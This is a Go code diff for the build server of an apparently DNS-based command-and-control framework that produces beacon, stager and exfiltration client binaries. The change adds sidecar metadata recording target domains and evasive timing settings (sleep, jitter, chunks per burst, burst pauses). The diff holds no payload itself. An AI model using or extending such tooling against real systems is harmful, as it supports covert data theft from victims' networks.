@@ -404,7 +404,7 @@ func (api *APIServer) handleBuildDNSServer(w http.ResponseWriter, r *http.Reques
 
 	// Save binary to builds directory
 	filename := fmt.Sprintf("dns-server-%s-%d", req.Domain, time.Now().Unix())
-	savedPath, err := api.saveBuild(binaryPath, filename, "dns-server")
+	savedPath, err := api.saveBuild(binaryPath, filename, "dns-server", nil)
 	if err != nil {
 		api.sendError(w, http.StatusInternalServerError, fmt.Sprintf("failed to save build: %v", err))
 		return
@@ -473,7 +473,20 @@ func (api *APIServer) handleBuildClient(w http.ResponseWriter, r *http.Request) 
 		ext = ".exe"
 	}
 	filename := fmt.Sprintf("beacon-%s-%s-%d%s", req.Platform, req.Architecture, time.Now().Unix(), ext)
-	savedPath, err := api.saveBuild(binaryPath, filename, "client")
+	metadata := &BuildMetadata{
+		Platform:     req.Platform,
+		Architecture: req.Architecture,
+		Domains:      append([]string(nil), req.DNSDomains...),
+		Timing: &BuildTimingMetadata{
+			SleepMinSec:    req.SleepMin,
+			SleepMaxSec:    req.SleepMax,
+			JitterMinMs:    req.ExfilJitterMinMs,
+			JitterMaxMs:    req.ExfilJitterMaxMs,
+			ChunksPerBurst: req.ExfilChunksPerBurst,
+			BurstPauseMs:   req.ExfilBurstPauseMs,
+		},
+	}
+	savedPath, err := api.saveBuild(binaryPath, filename, "client", metadata)
 	if err != nil {
 		api.sendError(w, http.StatusInternalServerError, fmt.Sprintf("failed to save build: %v", err))
 		return
@@ -640,7 +653,19 @@ func (api *APIServer) executeExfilBuildJob(jobID string, req ExfilClientBuildReq
 		ext = ".exe"
 	}
 	filename := fmt.Sprintf("exfil-%s-%s-%d%s", req.Platform, req.Architecture, time.Now().Unix(), ext)
-	savedPath, err := api.saveBuild(binaryPath, filename, "exfil")
+	metadata := &BuildMetadata{
+		Platform:     req.Platform,
+		Architecture: req.Architecture,
+		Domains:      append([]string(nil), req.Domains...),
+		Timing: &BuildTimingMetadata{
+			ChunkBytes:     req.ChunkBytes,
+			JitterMinMs:    req.JitterMinMs,
+			JitterMaxMs:    req.JitterMaxMs,
+			ChunksPerBurst: req.ChunksPerBurst,
+			BurstPauseMs:   req.BurstPauseMs,
+		},
+	}
+	savedPath, err := api.saveBuild(binaryPath, filename, "exfil", metadata)
 	if err != nil {
 		api.failExfilBuildJob(jobID, fmt.Errorf("failed to save exfil build: %w", err))
 		return
@@ -797,7 +822,27 @@ func (api *APIServer) handleBuildStager(w http.ResponseWriter, r *http.Request) 
 		ext = ".exe"
 	}
 	filename := fmt.Sprintf("stager-%s-%s-%d%s", req.Platform, req.Architecture, time.Now().Unix(), ext)
-	savedPath, err := api.saveBuild(binaryPath, filename, "stager")
+	var stagerDomains []string
+	if req.Domain != "" {
+		for _, part := range strings.Split(req.Domain, ",") {
+			trimmed := strings.TrimSpace(part)
+			if trimmed != "" {
+				stagerDomains = append(stagerDomains, trimmed)
+			}
+		}
+	}
+	metadata := &BuildMetadata{
+		Platform:     req.Platform,
+		Architecture: req.Architecture,
+		Domains:      stagerDomains,
+		Timing: &BuildTimingMetadata{
+			JitterMinMs:    req.JitterMinMs,
+			JitterMaxMs:    req.JitterMaxMs,
+			ChunksPerBurst: req.ChunksPerBurst,
+			BurstPauseMs:   req.BurstPauseMs,
+		},
+	}
+	savedPath, err := api.saveBuild(binaryPath, filename, "stager", metadata)
 	if err != nil {
 		api.sendError(w, http.StatusInternalServerError, fmt.Sprintf("failed to save build: %v", err))
 		return
@@ -1731,8 +1776,8 @@ func writeCargoConfig(buildDir string, cfg rustTargetConfig) error {
 	return os.WriteFile(configPath, []byte(content), 0644)
 }
 
-// saveBuild saves a compiled binary to the builds directory
-func (api *APIServer) saveBuild(sourcePath, filename, buildType string) (string, error) {
+// saveBuild saves a compiled binary to the builds directory and persists optional metadata
+func (api *APIServer) saveBuild(sourcePath, filename, buildType string, metadata *BuildMetadata) (string, error) {
 	// Ensure builds directory exists
 	typeDir := filepath.Join(buildsDir, buildType)
 	if err := os.MkdirAll(typeDir, 0755); err != nil {
@@ -1743,6 +1788,10 @@ func (api *APIServer) saveBuild(sourcePath, filename, buildType string) (string,
 	destPath := filepath.Join(typeDir, filename)
 	if err := copyFile(sourcePath, destPath); err != nil {
 		return "", fmt.Errorf("failed to copy binary: %w", err)
+	}
+
+	if err := writeBuildMetadata(destPath, metadata); err != nil {
+		fmt.Printf("Warning: failed to write metadata for %s: %v\n", filename, err)
 	}
 
 	return destPath, nil
@@ -1769,6 +1818,105 @@ func newBuildArtifact(buildType, filename, savedPath string) (*BuildArtifact, er
 		Size:         info.Size(),
 		DownloadPath: relativeBuildPath(savedPath),
 	}, nil
+}
+
+func writeBuildMetadata(destPath string, metadata *BuildMetadata) error {
+	if metadata == nil {
+		return nil
+	}
+	payload, err := json.MarshalIndent(metadata, "", "  ")
+	if err != nil {
+		return err
+	}
+	metaPath := destPath + ".meta.json"
+	return os.WriteFile(metaPath, payload, 0644)
+}
+
+func loadBuildMetadata(fullPath string) *BuildMetadata {
+	metaPath := fullPath + ".meta.json"
+	data, err := os.ReadFile(metaPath)
+	if err != nil {
+		if !os.IsNotExist(err) {
+			fmt.Printf("Warning: failed to read metadata for %s: %v\n", metaPath, err)
+		}
+		return nil
+	}
+
+	var meta BuildMetadata
+	if err := json.Unmarshal(data, &meta); err != nil {
+		fmt.Printf("Warning: failed to parse metadata for %s: %v\n", metaPath, err)
+		return nil
+	}
+	return &meta
+}
+
+func formatTimingRange(prefix string, minVal, maxVal int, unit string) string {
+	if minVal <= 0 && maxVal <= 0 {
+		return ""
+	}
+
+	switch {
+	case minVal > 0 && maxVal > 0:
+		if minVal == maxVal {
+			if unit == "" {
+				return fmt.Sprintf("%s %d", prefix, minVal)
+			}
+			return fmt.Sprintf("%s %d %s", prefix, minVal, unit)
+		}
+		if unit == "" {
+			return fmt.Sprintf("%s %d-%d", prefix, minVal, maxVal)
+		}
+		return fmt.Sprintf("%s %d-%d %s", prefix, minVal, maxVal, unit)
+	case minVal > 0:
+		if unit == "" {
+			return fmt.Sprintf("%s %d", prefix, minVal)
+		}
+		return fmt.Sprintf("%s %d %s", prefix, minVal, unit)
+	default:
+		if unit == "" {
+			return fmt.Sprintf("%s %d", prefix, maxVal)
+		}
+		return fmt.Sprintf("%s %d %s", prefix, maxVal, unit)
+	}
+}
+
+func formatBuildTiming(buildType string, meta *BuildMetadata) string {
+	if meta == nil || meta.Timing == nil {
+		return ""
+	}
+
+	t := meta.Timing
+	var parts []string
+
+	switch buildType {
+	case "client":
+		if label := formatTimingRange("Sleep", t.SleepMinSec, t.SleepMaxSec, "s"); label != "" {
+			parts = append(parts, label)
+		}
+		if label := formatTimingRange("Exfil jitter", t.JitterMinMs, t.JitterMaxMs, "ms"); label != "" {
+			parts = append(parts, label)
+		}
+	case "stager":
+		if label := formatTimingRange("Jitter", t.JitterMinMs, t.JitterMaxMs, "ms"); label != "" {
+			parts = append(parts, label)
+		}
+	case "exfil":
+		if t.ChunkBytes > 0 {
+			parts = append(parts, fmt.Sprintf("%d-byte chunks", t.ChunkBytes))
+		}
+		if label := formatTimingRange("Jitter", t.JitterMinMs, t.JitterMaxMs, "ms"); label != "" {
+			parts = append(parts, label)
+		}
+	}
+
+	if t.ChunksPerBurst > 0 {
+		parts = append(parts, fmt.Sprintf("%d chunks/burst", t.ChunksPerBurst))
+	}
+	if t.BurstPauseMs > 0 {
+		parts = append(parts, fmt.Sprintf("pause %d ms", t.BurstPauseMs))
+	}
+
+	return strings.Join(parts, " · ")
 }
 
 // storeClientBinaryForStager compresses, encodes, chunks, and stores client binary for stager deployment
@@ -1833,13 +1981,34 @@ func (api *APIServer) storeClientBinaryForStager(binaryPath, filename string, re
 	return nil
 }
 
+// BuildTimingMetadata captures timing-centric options recorded with a build artifact
+type BuildTimingMetadata struct {
+	SleepMinSec    int `json:"sleep_min_sec,omitempty"`
+	SleepMaxSec    int `json:"sleep_max_sec,omitempty"`
+	JitterMinMs    int `json:"jitter_min_ms,omitempty"`
+	JitterMaxMs    int `json:"jitter_max_ms,omitempty"`
+	ChunksPerBurst int `json:"chunks_per_burst,omitempty"`
+	BurstPauseMs   int `json:"burst_pause_ms,omitempty"`
+	ChunkBytes     int `json:"chunk_bytes,omitempty"`
+}
+
+// BuildMetadata stores supplemental context for saved builds
+type BuildMetadata struct {
+	Platform     string               `json:"platform,omitempty"`
+	Architecture string               `json:"architecture,omitempty"`
+	Domains      []string             `json:"domains,omitempty"`
+	Timing       *BuildTimingMetadata `json:"timing,omitempty"`
+}
+
 // Build represents a saved build
 type Build struct {
-	Name      string    `json:"name"`
-	Type      string    `json:"type"`
-	Size      int64     `json:"size"`
-	Timestamp time.Time `json:"timestamp"`
-	Path      string    `json:"path"`
+	Name      string         `json:"name"`
+	Type      string         `json:"type"`
+	Size      int64          `json:"size"`
+	Timestamp time.Time      `json:"timestamp"`
+	Path      string         `json:"path"`
+	Timing    string         `json:"timing,omitempty"`
+	Metadata  *BuildMetadata `json:"metadata,omitempty"`
 }
 
 type BuildArtifact struct {
@@ -1876,13 +2045,23 @@ func (api *APIServer) handleListBuilds(w http.ResponseWriter, r *http.Request) {
 				continue
 			}
 
-			builds = append(builds, Build{
+			fullPath := filepath.Join(typeDir, entry.Name())
+			build := Build{
 				Name:      entry.Name(),
 				Type:      buildType,
 				Size:      info.Size(),
 				Timestamp: info.ModTime(),
 				Path:      filepath.Join(buildType, entry.Name()),
-			})
+			}
+
+			if meta := loadBuildMetadata(fullPath); meta != nil {
+				build.Metadata = meta
+				if timing := formatBuildTiming(buildType, meta); timing != "" {
+					build.Timing = timing
+				}
+			}
+
+			builds = append(builds, build)
 		}
 	}
 
